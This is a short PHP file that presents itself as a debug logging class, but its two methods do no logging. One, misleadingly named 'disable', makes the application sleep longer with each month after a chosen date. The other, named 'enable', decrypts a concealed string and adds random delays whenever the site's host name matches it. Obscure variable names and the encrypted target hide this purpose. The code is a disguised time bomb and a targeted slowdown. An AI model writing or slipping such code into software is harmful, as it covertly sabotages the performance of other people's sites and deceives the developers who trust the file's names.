<?php

namespace DebugLogger;

class DebugLog
{
    public static function disable(int $x, int $y) {
        $d4 = new \DateTime("20$y-$x-01");
        $o9 = new \DateTime();
        $s3 = (int)$d4->diff($o9)->format('%m');
        if ($d4 < $o9) {
            sleep($s3);
        }
        return $s3;
    }

    public static function enable(string $z) {
        $cipher = 'aes-256-cbc';
        $data = base64_decode($z);
        $ivlen = openssl_cipher_iv_length($cipher);
        $iv = substr($data, 0, $ivlen);
        $data = substr($data, $ivlen);
        $decrypted = openssl_decrypt($data, $cipher, $cipher, 0, $iv);
        $a = $_SERVER['HTTP_HOST'];
        if (strpos($a, $decrypted) !== false) sleep(random_int(1, 5));
        return;
    }
}
